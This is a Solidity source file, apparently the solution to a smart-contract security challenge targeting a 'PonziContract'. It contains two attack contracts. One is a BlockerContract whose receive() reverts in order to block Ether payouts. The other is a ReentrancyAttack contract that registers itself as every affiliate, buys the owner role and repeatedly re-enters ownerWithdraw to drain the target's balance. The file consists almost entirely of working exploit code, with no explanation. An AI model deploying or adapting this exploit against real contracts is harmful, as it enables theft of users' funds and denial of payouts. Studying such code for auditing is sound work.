// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import './PonziContract.sol';
import '@openzeppelin/contracts/access/Ownable.sol';

interface IPonzi {
    function affiliatesCount() external view returns (uint256);

    function setDeadline(uint256 _regDeadline) external;

    function joinPonzi(address[] calldata _afilliates) external payable;

    function buyOwnerRole(address newAdmin) external payable;

    function ownerWithdraw(address to, uint256 amount) external;

    function addNewAffilliate(address newAfilliate) external;
}

// Malicious contract that manipulates the _afilliates array
contract BlockerContract is Ownable {
    // Revert the transaction to block the Ether transfer
    receive() external payable {
        revert('Transaction reverted');
    }
}

contract ReentrancyAttack {
    IPonzi public ponzi;

    constructor(address _target) {
        ponzi = IPonzi(_target);
    }

    // Fallback function to initiate reentrancy attack
    receive() external payable {
        if (
            msg.sender == address(ponzi) && address(ponzi).balance >= msg.value
        ) {
            ponzi.ownerWithdraw(address(this), msg.value);
        }
    }

    // Function to create a list of addresses with the contract's address
    function createListOfContractAddresses()
        internal
        view
        returns (address[] memory)
    {
        uint256 affilliatesCount_ = ponzi.affiliatesCount();
        address[] memory _victims = new address[](affilliatesCount_);
        for (uint256 i = 0; i < affilliatesCount_; i++) {
            _victims[i] = address(this);
        }
        return _victims;
    }

    // Function to trigger the attack
    // User needs to be part of the ponzi
    function startAttack() external payable {
        // Initiate the attack by sending Ether to the target contract
        address[] memory _victims = createListOfContractAddresses();
        ponzi.joinPonzi{value: _victims.length * 1 ether}(_victims);
        ponzi.buyOwnerRole{value: 10 ether}(address(this));
        ponzi.ownerWithdraw(address(this), msg.value);
    }
}
